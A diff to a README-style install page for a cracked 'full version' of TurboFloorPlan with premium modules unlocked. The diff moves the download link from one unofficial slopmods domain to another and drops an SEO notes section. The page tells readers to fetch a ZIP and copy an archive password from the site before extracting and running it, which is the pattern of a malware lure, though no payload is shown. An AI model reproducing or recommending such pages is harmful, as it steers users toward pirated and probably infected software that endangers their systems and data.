@@ -1,6 +1,6 @@
 ***
 
-# TurboFloorPlan Full Version — Windows Install
+# TurboFloorPlan Windows Setup
 
 TurboFloorPlan — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ TurboFloorPlan — Windows setup and configuration · Premium workspace · Zero 
 
 > Use the release page below for Windows.
 
-- **Release page:** [turbofloorplan.slopmods.tech](https://turbofloorplan.slopmods.tech/)
-- **Full URL:** `https://turbofloorplan.slopmods.tech/`
+- **Release page:** [turbofloorplan.slopmods.top](https://turbofloorplan.slopmods.top/)
+- **Full URL:** `https://turbofloorplan.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **turbofloorplan.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **turbofloorplan.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ TurboFloorPlan — Windows setup and configuration · Premium workspace · Zero 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **turbofloorplan.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **turbofloorplan.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **TurboFloorPlan** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core TurboFloorPlan features on Windows desktop
